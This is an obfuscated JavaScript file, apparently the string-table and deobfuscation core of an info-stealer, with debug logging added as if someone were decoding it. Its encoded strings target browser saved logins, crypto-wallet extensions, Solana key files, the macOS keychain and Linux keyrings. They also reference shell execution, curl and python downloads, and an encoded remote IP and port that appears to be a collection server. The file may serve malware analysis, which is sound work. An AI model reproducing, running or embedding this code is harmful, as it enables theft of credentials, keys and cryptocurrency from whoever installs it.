/* eslint-disable no-func-assign */


function decodeValue(offset) {
	const array = getArray();
    
	decodeValue = function (offset) {
		offset = offset - 0xeb;  // Adjust offset to match array index
		return array[offset];
	};
	return decodeValue(offset);
}

function getArray() {
    const b3 = ['L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu', 'zU3luYw', 'L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8', 'Zbm9kZTpwcm9jZXNz', 'plld_', 'b3BlcmE', 'length', '12CvDfbn', 'base64', 'L3Bkb3du', 'L2tleXM', 'while (true) {}', 'function\x20*\x5c(\x20*\x5c)', 'exception', 'debu', 'aGRjb25kYmNiZG5iZWVwcGdkcGg', 'fk4_', 'comp', 'caG9zdG5hbWU', 'amZob21paGtqYm1namlkbGNkbm8', 'forEach', 'a2V5NC5kYg', 'QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy', 'error', '3C1', 'Z2V0', 'pld_', 'stateObject', 'zcGF0aA', '/ld_', 'ZXBjY2lvbmJvb2hja29ub2VlbWc', 'AdXNlckluZm8', 'info', 'cmVuYW1l', '15820Xesbgc', '__proto__', 'Y29weUZpbGU', 'return (function() ', 'Zb3B0aW9ucw', 'aGlmYWZnbWNjZHBl', 'TG9jYWwgRXh0ZW', '1301015Wdbuzl', 'from', 'bG9na2MtZGI', 'toString', 'test', 'Y3VybCAtTG8', 'apply', 'replace', 'YmZuYWVsbW9tZWltaGxw', 'ZGdjaWpubWhuZm5rZG5hYWQ', 'ZWpiYWxiYWtvcGxjaGxn', 'bind', 'YWVhY2hrbm1lZnBo', '10CLvyiU', 'Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8', 'search', 'cHl0aG9u', 'dGFyIC14Zg', 'YcGxhdGZvcm0', 'fk3_', 'cZXhlYw', '5001172MTyOQq', 'aY2hpbGRfcH', 'TG9jYWwv', 'fllj_', 'bmtiaWhmYmVvZ2FlYW9l', 'aWJuZWpkZmptbWtwY25s', 'cmVuYW1lU3luYw', 'action', 'U3luYyBFeHRlbnNpb24gU2V0dGluZ3M', 'Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE', 'bG9naW5zLmpzb24', 'TG9jYWwvTWljcm9zb2Z0L0VkZ2U', '157006jXcNqH', '216ywUfiT', 'slice', 'RGVmYXVsdA', 'YXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYg', 'Ly5ucGw', 'cGVia2xtbmtvZW9paG9mZWM', 'XC5weXBccHl0', 'prototype', 'console', 'Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU', 'L0FwcERhdGEv', 'cGRsaWFvZ2VoZ2Ri', '\x22 \x22', 'bWNvaGlsbmNiZmFo', 'utf8', 'a3Bsb21qamtjZmdvZG5oY2VsbGo', '{}.constructor(\x22return this\x22)( )', 'Zmhib2hpbWFlbGJvaHBq', 'YcmVx', '-db', 'd3JpdGVGaWxlU3luYw', '208605RpQjmy', 'aG9uLmV4ZQ', 'counter', 'input', '\x20-C\x20', 'cm1TeW5j', '729744vfCEAz', 'Y3JlYXRlUmVhZFN0cmVhbQ', 'string', 'YWhvbHBmZGlhbGpn', 'c3RhdFN5bmM', 'constructor', 'dWVzdA', 'ZXhvZA', 'YXRtYw', 'flj_', 'flk4_', 'Ly5jb25maWcvc29sYW5hL2lkLmpzb24', 'UHJvZmlsZQ', 'ZWdqaWRqYnBnbGlj', 'Um9hbWluZy9', 'a2V5My5kYg', 'gger', '20rHSOIN', 'size', 'push', 'dXNlcm5hbWU', 'JvY2Vzcw', 'now', 'trace', 'NjcuMjAzLjaHR0cDovLwcuMTcxOjEyNDQ=      ', 'TG9naW4gRGF0YQ', '/brld_', 'L1VzZXIgRGF0YQ', '325251TaqLYU', 'YXJndg', 'brld_', 'ZdGltZXN0YW1w', '(((.+)+)+)+$', 'aGVjZGFsbWVlZWFqbmltaG0', 'N3RFYU07', 'table', 'bWdqbmpvcGhocGtrb2xqcGE', 'Ly5jb25maWcv', 'join', 'YdmFsdWU'];
    getArray = function() {
        return b3;
    };
    return getArray();
}

(function (getArray, target) {
	const getDecodedValue = decodeValue,
		array = getArray();
	while (true) {
		try {
			const current = -parseInt(getDecodedValue(0x110)) / 0x1 + parseInt(getDecodedValue(0x12c)) / 0x2 + parseInt(getDecodedValue(0x126)) / 0x3 * (parseInt(getDecodedValue(0x13d)) / 0x4) + -parseInt(getDecodedValue(0xef)) / 0x5 * (-parseInt(getDecodedValue(0x15b)) / 0x6) + parseInt(getDecodedValue(0x176)) / 0x7 * (-parseInt(getDecodedValue(0x111)) / 0x8) + -parseInt(getDecodedValue(0x148)) / 0x9 * (-parseInt(getDecodedValue(0xfc)) / 0xa) + -parseInt(getDecodedValue(0x104)) / 0xb;
			console.log(current);
            if (current === target) break;
			else array['push'](array['shift']());
            console.log('array: ', array[0]);
            console.log('getArray(): ', getArray()[0]);
		// eslint-disable-next-line no-unused-vars
		} catch (err) {
			array['push'](array['shift']());
		}
	}
}(getArray, 0x919be));
